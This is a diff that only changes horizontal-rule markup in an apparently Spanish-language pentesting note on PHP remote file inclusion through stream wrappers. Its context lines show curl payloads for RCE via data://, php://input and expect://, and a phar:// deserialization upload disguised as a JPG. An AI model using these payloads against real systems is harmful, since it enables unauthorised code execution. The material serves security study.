@@ -18,7 +18,7 @@ linked:
 ---
 # RFI - PHP Wrappers y Schemes
 
-***
+---
 
 ## `data://` URI
 
@@ -44,7 +44,7 @@ B64=$(echo -n "$PAYLOAD" | base64 -w0)
 curl "https://target/?page=data://text/plain;base64,${B64}&c=id"
 ```
 
-___
+---
 
 ## `php://input` (POST Body)
 
@@ -71,7 +71,7 @@ curl -X POST \
   "https://target/index.php?page=php://input&c=id"
 ```
 
-___
+---
 
 ## `expect://` (RCE Direct)
 
@@ -89,7 +89,7 @@ ___
 | `curl 'https://target/?page=expect://EXPECT://id'` (case variant) | Case-sensitive bypass | Edge. |
 ^rfi-wrapper-expect
 
-___
+---
 
 ## `phar://` Deserialization Trigger
 
@@ -123,7 +123,7 @@ curl -X POST -F "file=@evil.phar;filename=evil.jpg" \
 curl -s "https://target/index.php?page=phar:///var/www/uploads/evil.jpg"
 ```
 
-___
+---
 
 ## `ssh2://` y Otros
 
@@ -152,4 +152,4 @@ ___
 
 Typical output: `https, ftps, http, ftp, zip, compress.zlib, compress.bzip2, php, file, glob, data, phar, ssh2.shell, ssh2.exec, ...`
 
-***
+---
